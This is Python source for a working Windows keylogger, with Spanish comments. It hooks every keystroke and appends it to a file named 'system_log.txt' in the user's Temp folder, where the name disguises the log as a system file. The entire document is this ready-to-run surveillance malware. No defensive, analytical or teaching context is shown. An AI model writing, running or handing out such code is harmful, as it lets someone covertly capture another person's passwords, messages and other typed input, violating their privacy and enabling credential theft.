import time
import keyboard
import os
import datetime
import sys

def keylogger():
    log_file = os.path.join(os.path.expanduser("~"), "AppData", "Local", "Temp", "system_log.txt")
    
    def guardarDatos(datos):
        try:
            with open(log_file, "a", encoding="utf-8") as f:
                f.write(datos)
        except Exception as e:
            pass

    def key(event):
        if event.event_type == keyboard.KEY_DOWN:
            special_keys = {
                'space': ' ',
                'enter': '\n', 
                'backspace': '',  
                'tab': '    ',    
                'shift': '',
                'ctrl': '',
                'alt': '',
                'caps lock': '[BLOQ_MAYUS]',
                'esc': '[ESC]',
                'windows': '[WIN]',
                'right shift': '',
                'left shift': '',
                'right ctrl': '',
                'left ctrl': '',
                'right alt': '',
                'left alt': '',
                'menu': '[MENU]'
            }
            
            keychar = special_keys.get(event.name, event.name)
            if event.name in ['shift', 'ctrl', 'alt', 'right shift', 'left shift', 
                            'right ctrl', 'left ctrl', 'right alt', 'left alt', 'windows']:
                return
            if keychar:
                guardarDatos(keychar)

    print(f"Keylogger iniciado. Registrando en: {log_file}")
    print("El programa ahora corre en segundo plano...")

    keyboard.hook(key)
    
    try:
        while True:
            time.sleep(60)  
    except:
        pass

if __name__ == "__main__":
    keylogger()    